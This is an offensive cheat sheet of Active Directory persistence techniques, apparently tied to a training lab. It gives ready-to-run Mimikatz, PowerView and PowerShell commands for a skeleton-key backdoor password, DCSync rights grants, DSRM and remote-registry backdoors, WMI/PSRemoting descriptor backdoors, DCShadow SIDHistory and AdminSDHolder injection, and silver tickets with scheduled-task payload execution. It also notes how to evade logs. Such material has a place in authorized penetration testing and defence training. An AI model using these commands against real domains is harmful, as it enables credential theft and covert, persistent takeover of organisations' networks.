# AD Domain Persistence Techniques

> **Pre-req:** `source /opt/venvTools/bin/activate`

## Skeleton Key — Universal Backdoor Password on DC

### Mimikatz Skeleton Key (DA Required — Injects into LSASS) [added: 2026-04]
- **Tags:** #SkeletonKey #Mimikatz #LSSASPatch #BackdoorPassword #Persistence #DomainController #T1556.001
- **Trigger:** Have DA on DC; need persistent backdoor password for all domain accounts that survives credential resets
- **Prereq:** Domain Admin on Domain Controller, Mimikatz with SeDebugPrivilege
- **Yields:** Universal backdoor password ("mimikatz") accepted for ANY domain account until DC reboot
- **Opsec:** High
- **Context:** DA on DC — patches LSASS to accept "mimikatz" as password for ANY domain account; survives until DC reboot. Highly detectable (LSASS patch).
- **Payload/Method:**
  ```
  # Run on DC with DA privs
  privilege::debug
  misc::skeleton
  # All users can now auth with password "mimikatz" OR their real password
  # e.g.: Enter-PSSession -ComputerName dc01 -Credential domain\Administrator
  # Password: mimikatz
  ```

## Grant DCSync Rights to Arbitrary User (Stealth Persistence)

### PowerView DCSync Rights Grant (May Evade Detection) [added: 2026-04]
- **Tags:** #DCSync #Persistence #ACLBackdoor #PowerView #AddObjectACL #StealthPersistence #T1098
- **Trigger:** Have DA; need persistent DCSync capability from a low-priv account without maintaining DA access
- **Prereq:** Domain Admin privileges, PowerView loaded
- **Yields:** Low-priv account with DCSync rights (can pull all domain hashes anytime without DA)
- **Opsec:** Med
- **Context:** DA — grant a low-priv account DCSync rights so you can pull hashes any time without DA
- **Payload/Method:**
  ```powershell
  Add-ObjectACL -TargetDistinguishedName "dc=domain,dc=local" \
    -PrincipalSamAccountName student1 \
    -Rights DCSync
  # Now as student1:
  lsadump::dcsync /user:domain\krbtgt /domain:domain.local
  # or: secretsdump.py domain/student1:password@dc-ip -just-dc
  ```

## DC DSRM Admin — Backdoor via Directory Services Restore Mode

### Enable Remote DSRM Admin Login → Persistent DC Local Admin [added: 2026-04]
- **Tags:** #DSRM #DSRMAdmin #Persistence #RegistryBackdoor #OverPassTheHash #DomainController #T1556
- **Trigger:** Have DA on DC; need persistence that survives domain account password resets (DSRM password never expires)
- **Prereq:** Domain Admin on DC, Mimikatz for SAM dump and OPtH, registry write access
- **Yields:** Persistent local admin access to DC via DSRM hash (survives domain credential resets)
- **Opsec:** Med
- **Context:** DA on DC — DSRM password never expires; enable remote logon to persist even if domain accounts are reset
- **Payload/Method:**
  ```powershell
  # Dump DSRM/local admin hash from DC
  # (in Mimikatz) lsadump::sam

  # Enable remote DSRM logon (registry change)
  New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" \
    -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD -Verbose

  # Use overpass-the-hash with DSRM local admin hash to access DC
  sekurlsa::pth /user:Administrator /domain:dcorp-dc \
    /ntlm:<DSRM-local-admin-hash> /run:powershell.exe
  # Then connect: Enter-PSSession dcorp-dc
  ```

## DAMP — DC Registry Backdoor for Remote Hash Retrieval

### Add-RemoteRegBackdoor → Persistent Remote Hash Dump Without DA [added: 2026-04]
- **Tags:** #DAMP #RemoteRegBackdoor #RegistryACL #Persistence #RemoteHashDump #T1547.001
- **Trigger:** Have DA; need persistent ability to remotely read SAM/SYSTEM/SECURITY hives from DC as a low-priv user
- **Prereq:** Domain Admin, DAMP toolkit (Add-RemoteRegBackdoor), target DC accessible via remote registry
- **Yields:** Low-priv "trustee" user can remotely dump DC machine hash, local hashes, and cached credentials anytime
- **Opsec:** Med
- **Context:** DA — backdoor DC registry ACLs so a low-priv "trustee" user can remotely read SAM/SYSTEM/SECURITY hives anytime
- **Payload/Method:**
  ```powershell
  # Install backdoor as DA (using DAMP toolkit)
  Add-RemoteRegBackdoor -ComputerName dcorp-dc.domain.local -Trustee student1 -Verbose

  # Later, as student1 (no DA needed):
  # Get DC machine account hash (for silver ticket)
  Get-RemoteMachineAccountHash -ComputerName dcorp-dc

  # Get local account hashes (SAM)
  Get-RemoteLocalAccountHash -ComputerName dcorp-dc

  # Get cached domain credentials
  Get-RemoteCachedCredential -ComputerName dcorp-dc
  ```

## WMI / PSRemoting Security Descriptor Persistence

### Backdoor WMI Access on DC for Non-Admin User [added: 2026-04]
- **Tags:** #WMI #PSRemoting #SecurityDescriptor #DCOMBackdoor #Persistence #RemoteExec #T1546.003
- **Trigger:** Have DA; need persistent WMI/PSRemoting access to DC for a low-priv user
- **Prereq:** Domain Admin, Set-RemoteWMI.ps1 and/or Set-RemotePSRemoting.ps1 available
- **Yields:** Low-priv user with WMI and PSRemoting command execution on DC without DA
- **Opsec:** Med
- **Context:** DA — modify DCOM/WMI security descriptors to allow a low-priv user to execute WMI on DC
- **Payload/Method:**
  ```powershell
  # Grant WMI access (using Set-RemoteWMI.ps1)
  Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc.domain.local -Verbose

  # Grant PSRemoting access (using Set-RemotePSRemoting.ps1)
  Set-RemotePSRemoting -UserName student1 -ComputerName dcorp-dc.domain.local -Verbose

  # Execute commands via WMI as student1 (no DA)
  Invoke-WmiMethod win32_process -ComputerName dcorp-dc -Name create \
    -ArgumentList "powershell.exe -e <encoded-cmd>"

  # PSRemoting
  Invoke-Command -ComputerName dcorp-dc -ScriptBlock {whoami}
  ```

## DCShadow — Masquerade as DC to Push Arbitrary AD Changes

### DCShadow Attack — Stealth AD Attribute Manipulation [added: 2026-04]
- **Tags:** #DCShadow #RogueDC #Replication #SIDHistory #AdminSDHolder #StealthPersistence #T1207
- **Trigger:** Have DA/EA; need to make stealth AD changes (SIDHistory injection, AdminSDHolder backdoor) without standard DC logs
- **Prereq:** DA or EA privileges, Mimikatz with DCShadow support, ability to register temporary DC
- **Yields:** Arbitrary AD attribute changes replicated silently (SPN set, SIDHistory injection, AdminSDHolder backdoor)
- **Opsec:** Med
- **Context:** DA/EA — temporarily registers a rogue DC to replicate changes into AD without standard logs; ideal for stealth SIDHistory injection or AdminSDHolder backdoor
- **Payload/Method:**
  ```powershell
  # Optional: Grant DCShadow permissions to non-DA account (for operational security)
  Set-DCShadowPermissions -FakeDC <attacker-machine> \
    -SAMAccountName student1 \
    -Username student1 -Verbose

  # Stage changes using Mimikatz (from any machine)
  # Set SPN on user
  lsadump::dcshadow /object:root355user /attribute:serviceprincipalname \
    /value:"ops/legit"

  # Inject SIDHistory (make user = Enterprise Admin)
  lsadump::dcshadow /object:root355user /attribute:SIDHistory \
    /value:S-1-5-21-<parentdomain>-519

  # Backdoor AdminSDHolder (grants full control propagated to all protected objects)
  # First: get current ACL SDDL
  (New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=AdminSDHolder,CN=System,DC=domain,DC=local")).psbase.ObjectSecurity.sddl
  # Append: A;;CCDCLCSWRPWPLOCRRCWDWO;;;<target-user-SID>
  lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=domain,DC=local \
    /attribute:ntSecurityDescriptor /value:<modified-SDDL>

  # Push all staged changes (run as DA or as delegated user)
  lsadump::dcshadow /push
  # Changes replicate silently — no standard DC security event logs
  ```

## Silver Ticket — Forge Service Ticket Without DC

### Silver Ticket for Targeted Service Access (No DC Contact) [added: 2026-04]
- **Tags:** #SilverTicket #ForgedTGS #Mimikatz #Kerberos #ServiceTicket #NoDCContact #T1558.002
- **Trigger:** Have NTLM hash of a machine/service account; need access to specific service without contacting DC
- **Prereq:** NTLM hash of target service/machine account, domain SID, Mimikatz available
- **Yields:** Forged TGS for specific service (CIFS for file access, HOST for schtasks, LDAP for DCSync) without DC contact
- **Opsec:** Low
- **Context:** Have NTLM hash of a service/machine account — forge TGS for specific services without touching DC
- **Payload/Method:**
  ```
  # SPN reference: HOST (schtasks/WMI), CIFS (file access), HTTP (WinRM), LDAP (DCSync)
  kerberos::golden /user:Administrator \
    /domain:domain.local \
    /sid:S-1-5-21-<domain-sid> \
    /target:dcorp-dc.domain.local \
    /service:cifs \
    /rc4:<machine-account-NTLM-hash> \
    /ptt
  # Access: ls \\dcorp-dc\c$

  # For scheduled task execution (HOST SPN):
  kerberos::golden /user:Administrator /domain:domain.local \
    /sid:S-1-5-21-<domain-sid> /target:server.domain.local \
    /service:HOST /rc4:<machine-hash> /ptt
  schtasks /create /tn "shell" /ru "SYSTEM" /tr "cmd.exe /c <payload>" /sc once /st 00:00 /s server
  schtasks /RUN /TN "shell" /s server
  ```
